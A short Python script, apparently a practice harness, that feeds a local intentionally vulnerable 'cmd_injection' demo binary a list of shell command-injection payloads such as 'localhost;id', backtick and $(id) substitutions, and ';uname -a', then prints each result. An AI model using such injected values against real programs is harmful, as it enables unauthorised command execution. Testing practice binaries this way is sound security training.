#!/usr/bin/env python3
import subprocess
import sys


def main() -> int:
    binary = (
        sys.argv[1]
        if len(sys.argv) > 1
        else "demos/practice-binaries/command-injection/cmd_injection"
    )

    payloads = [
        "localhost",
        "localhost;id",
        "localhost&&id",
        "localhost|id",
        "localhost`id`",
        "localhost$(id)",
        "localhost;whoami",
        "localhost;uname -a",
    ]

    for payload in payloads:
        print(f"\n-- Payload: {payload} --")
        try:
            result = subprocess.run([binary, "ping", payload], capture_output=True, timeout=2, text=True)
            out = (result.stdout or "")
            print(out[-300:])
        except Exception as exc:
            print(f"ERROR: {exc}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
